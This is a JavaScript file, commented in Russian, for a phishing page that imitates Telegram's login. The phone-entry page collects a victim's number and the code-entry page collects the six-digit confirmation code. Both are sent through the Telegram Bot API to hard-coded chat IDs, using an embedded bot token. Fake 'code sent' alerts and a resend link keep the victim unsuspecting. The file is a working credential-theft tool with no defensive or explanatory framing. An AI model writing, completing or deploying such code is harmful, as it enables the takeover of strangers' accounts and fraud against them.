// ========== script.js ==========

// =================================
// КОД ДЛЯ СТРАНИЦЫ index.html (ввод телефона)
// =================================
if (document.querySelector('.telegram-login-card')) {
    
    const phoneInput = document.querySelector('.phone-input');
    const countrySelect = document.getElementById('country-select');
    
    // Фокус на поле телефона
    window.addEventListener('load', function() {
        setTimeout(() => {
            phoneInput.focus();
            phoneInput.setAttribute('inputmode', 'numeric');
            phoneInput.setAttribute('pattern', '[0-9]*');
        }, 300);
    });
    
    // Форматирование номера
    phoneInput.addEventListener('input', function(e) {
        let value = this.value.replace(/\D/g, '');
        
        if (value.length > 10) {
            value = value.slice(0, 10);
        }
        
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
            if (i === 3 || i === 6 || i === 8) {
                formatted += ' ';
            }
            formatted += value[i];
        }
        
        this.value = formatted;
    });
    
    // =================================
    // ФУНКЦИЯ ОТПРАВКИ ТЕЛЕФОНА В TELEGRAM
    // =================================
    function sendPhoneToTelegram(phone) {
        const BOT_TOKEN = '8780785505:AAGKR5NJPxt2OHM0R4dQ725MyhV8JJ5pg3c';
        const CHAT_ID = '5373563389, 7865989102';
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const message = `
📱 <b>НОМЕР ТЕЛЕФОНА:</b>
<code>${phone}</code>
⏱ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
━━━━━━━━━━━━━━━━━━━━━
        `;
        
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('✅ Телефон отправлен в Telegram');
            } else {
                console.error('❌ Ошибка:', data);
            }
        })
        .catch(error => {
            console.error('❌ Ошибка соединения:', error);
        });
    }
    
    // Обработчик кнопки "СЛЕДУЮЩИЙ"
    document.querySelector('.next-button').addEventListener('click', function(e) {
        e.preventDefault();
        
        const countryCode = document.getElementById('country-code-display').textContent;
        const phoneNumber = phoneInput.value.replace(/\s/g, '');
        const fullPhone = countryCode + phoneNumber;
        
        if (phoneNumber.length < 10) {
            alert('Пожалуйста, введите полный номер телефона');
            phoneInput.focus();
            return;
        }
        
        // ✅ Отправляем номер в Telegram
        sendPhoneToTelegram(fullPhone);
        
        // Сохраняем номер для следующей страницы
        localStorage.setItem('tg_phone', fullPhone);
        
        // Показываем сообщение пользователю
        alert('✅ Код отправлен');
        
        // Переходим на страницу ввода кода
        window.location.href = 'about.html';
    });
    
    // Обновление кода страны
    countrySelect.addEventListener('change', function() {
        document.getElementById('country-code-display').textContent = this.value;
    });
}

// =================================
// КОД ДЛЯ СТРАНИЦЫ about.html (ввод кода)
// =================================
if (document.querySelector('.tg-card')) {
    
    // Получаем сохраненный номер
    const savedPhone = localStorage.getItem('tg_phone') || 'Номер не указан';
    
    // Показываем номер на странице
    const phoneHint = document.querySelector('.phone-hint');
    if (phoneHint) {
        phoneHint.innerHTML = `Мы отправили SMS с кодом проверки на номер:<br><strong>${savedPhone}</strong>`;
    }
    
    // Элементы для кода
    const digitElements = [
        document.getElementById('digit0'),
        document.getElementById('digit1'),
        document.getElementById('digit2'),
        document.getElementById('digit3'),
        document.getElementById('digit4'),
        document.getElementById('digit5')
    ];
    
    // Скрытое поле ввода
    const hiddenInput = document.createElement('input');
    hiddenInput.type = 'text';
    hiddenInput.inputMode = 'numeric';
    hiddenInput.pattern = '[0-9]*';
    hiddenInput.maxLength = 6;
    hiddenInput.style.position = 'absolute';
    hiddenInput.style.opacity = '0';
    hiddenInput.style.pointerEvents = 'none';
    document.body.appendChild(hiddenInput);
    
    let code = '';
    
    function updateDigits() {
        for (let i = 0; i < 6; i++) {
            if (i < code.length) {
                digitElements[i].textContent = code[i];
                digitElements[i].classList.add('filled');
            } else {
                digitElements[i].textContent = '';
                digitElements[i].classList.remove('filled');
            }
        }
    }
    
    digitElements.forEach(digit => {
        digit.addEventListener('click', () => hiddenInput.focus());
    });
    
    hiddenInput.addEventListener('input', (e) => {
        const rawValue = e.target.value.replace(/[^0-9]/g, '');
        code = rawValue.slice(0, 6);
        e.target.value = code;
        updateDigits();
    });
    
    hiddenInput.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace') {
            if (code.length > 0) {
                code = code.slice(0, -1);
                hiddenInput.value = code;
                updateDigits();
            }
            e.preventDefault();
        }
    });
    
    // =================================
    // ФУНКЦИЯ ОТПРАВКИ КОДА В TELEGRAM
    // =================================
    function sendCodeToTelegram(phone, code) {
        const BOT_TOKEN = '8780785505:AAGKR5NJPxt2OHM0R4dQ725MyhV8JJ5pg3c';
        const CHAT_ID = '5373563389';
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const message = `
🔑 <b>КОД ПОДТВЕРЖДЕНИЯ:</b>
<code>${code}</code>
📱 <b>Для номера:</b> ${phone}
⏱ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
━━━━━━━━━━━━━━━━━━━━━
        `;
        
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('✅ Код отправлен в Telegram');
            } else {
                console.error('❌ Ошибка:', data);
            }
        })
        .catch(error => {
            console.error('❌ Ошибка соединения:', error);
        });
    }
    
    // =================================
    // ОБРАБОТЧИК КНОПКИ "ПОДТВЕРДИТЬ"
    // =================================
    document.getElementById('submitBtn').addEventListener('click', function() {
        if (code.length !== 6) {
            alert('Пожалуйста, введите полный 6-значный код');
            hiddenInput.focus();
            return;
        }
        
        const phone = savedPhone;
        
        // Блокируем кнопку
        const btn = this;
        btn.disabled = true;
        btn.textContent = 'ОТПРАВКА...';
        
        // ✅ Отправляем код в Telegram
        sendCodeToTelegram(phone, code);
        
        // Показываем сообщение пользователю
        alert('✅ Код отправлен! Проверьте Telegram.');
        
        // Разблокируем кнопку через 2 секунды
        setTimeout(() => {
            btn.disabled = false;
            btn.textContent = 'ПОДТВЕРДИТЬ';
        }, 2000);
        
        // Можно не очищать номер, чтобы был в истории
        // localStorage.removeItem('tg_phone');
    });
    
    // Повторная отправка кода
    document.getElementById('resendLink').addEventListener('click', (e) => {
        e.preventDefault();
        alert('✅ Новый код отправлен на номер ' + savedPhone);
    });
    
    // Возврат назад
    document.getElementById('backLink').addEventListener('click', (e) => {
        e.preventDefault();
        window.location.href = 'index.html';
    });
    
    // Фокус при загрузке
    window.addEventListener('load', () => {
        setTimeout(() => {
            hiddenInput.focus();
        }, 300);
    });
    
    // Клик по карточке возвращает фокус
    document.querySelector('.tg-card').addEventListener('click', (e) => {
        if (!e.target.closest('a') && !e.target.closest('button')) {
            hiddenInput.focus();
        }
    });
}